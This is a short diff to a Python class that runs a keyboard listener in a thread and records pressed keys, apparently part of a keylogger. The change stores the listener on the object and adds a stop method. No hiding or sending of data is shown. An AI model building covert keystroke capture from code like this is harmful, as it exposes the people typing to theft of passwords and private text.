@@ -12,8 +12,12 @@ class log(threading.Thread):
     def run(self):
         with Listener(
                 on_press=(self.temp)
-                ) as listener:
-            listener.join()
+                ) as self.listener:
+            self.listener.join()
+
+    def stop(self):
+        self.listener.stop()
+        print("Logger Stopped")
             
 def on_press(key, self):
         keys_clicked = self.keys_clicked
